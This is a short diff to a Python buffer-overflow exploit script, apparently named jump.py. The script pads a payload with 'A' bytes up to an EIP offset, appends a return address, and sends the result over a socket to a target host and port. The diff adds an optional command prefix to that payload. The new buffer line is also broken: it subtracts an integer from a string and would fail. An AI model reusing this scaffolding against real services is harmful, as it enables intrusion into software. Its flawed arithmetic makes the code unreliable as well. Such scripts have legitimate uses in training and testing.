@@ -15,7 +15,7 @@ if len(sys.argv) == 2:
     exit(0) 
 
 
-if len(sys.argv) != 4:
+if len(sys.argv) < 4:
     print("usage: \"python jump.py [target] [port] [eip]")
     print("usage: make sure to change the value of \"ret\"")
     print("usage: make sure to set a breakpoint at the jump address! as well!")
@@ -25,12 +25,17 @@ target = sys.argv[1]
 port = int(sys.argv[2])
 eip = int(sys.argv[3])
 ret = "change me!"
+if len(sys.argv) == 5:
+    cmd = sys.argv[4] + " "
+else:
+    cmd = ""
+
 
 if ret == "change me!":
     print("you need to change \"ret\" to the output of \"./jump.py [return address]\"")
     exit(0)
 
-inputBuffer = "A" * eip + ret
+inputBuffer = cmd + "A" * eip - len(cmd) + ret 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((target,port))
 print("sending buffer")
